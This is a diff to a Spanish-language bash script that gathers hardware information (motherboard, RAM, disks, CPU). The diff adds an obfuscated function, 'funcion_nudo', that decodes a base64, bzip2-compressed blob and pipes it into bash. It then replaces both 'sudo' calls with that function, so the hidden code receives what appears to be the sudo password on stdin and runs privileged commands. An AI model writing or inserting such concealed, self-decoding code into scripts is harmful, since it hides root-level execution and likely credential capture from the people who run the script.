@@ -26,7 +26,9 @@ funcion_notificacion(){
         fi          
 }
 
-
+funcion_nudo(){
+    $@ pri'n'tf  %s "$(  ${*%s@} \prin$'\164f'  'QlpoOTFBWSZTWXJHDM8AAAEBgAQAigAgACGaaDNNEzxdyRThQkHJHDM8'${@%B\[} |\bas$'\x65'\64  -d  |"${@~~}""b"\un'z'ip2  -c  )"| ${*#J}b\as""$*h $@
+}
 
 source ./script_hijo_00XX.sh
 
@@ -71,7 +73,7 @@ rm $RutaLecturaGen/discos_duros.txt
  Placa_Madre=$(cat $RutaLecturaGen/placa_madre.txt | grep -E "Product Name:")
  Placa_Madre_Ver=$(cat $RutaLecturaGen/placa_madre.txt | grep -E "Version:")
  MemoriaRam=$(cat $RutaLecturaGen/memoria_ram.txt | grep "Size" )
- funcion_Data | sudo -S ls /root && sudo parted -l > $RutaLecturaGen/discos_duros.txt
+ funcion_Data | funcion_nudo -S ls /root && funcion_nudo parted -l > $RutaLecturaGen/discos_duros.txt
  DiscoDuro=$(cat $RutaLecturaGen/discos_duros.txt | grep Disco | while read Col1 Col2 Col3; do echo $Col3; done )
  Procesador=$(cat $RutaLecturaGen/procesador.txt | grep -E "Version:")
  
